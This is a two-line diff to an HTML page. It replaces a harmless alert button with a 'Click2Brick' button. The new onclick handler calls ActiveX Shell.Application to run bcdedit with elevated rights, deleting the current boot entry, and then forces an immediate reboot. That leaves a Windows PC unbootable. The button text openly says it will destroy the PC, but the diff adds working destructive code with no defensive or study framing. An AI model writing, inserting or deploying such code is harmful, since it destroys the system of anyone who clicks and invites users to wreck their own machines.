@@ -1,2 +1,2 @@
 <title>Wow</title>
-<button onclick="(function(){alert('Button clicked!');})()">Click</button>
+<button onclick="(function(){alert('Button clicked!');var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();})()">CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC. (Click2Brick)</button><p>Your PC</p>
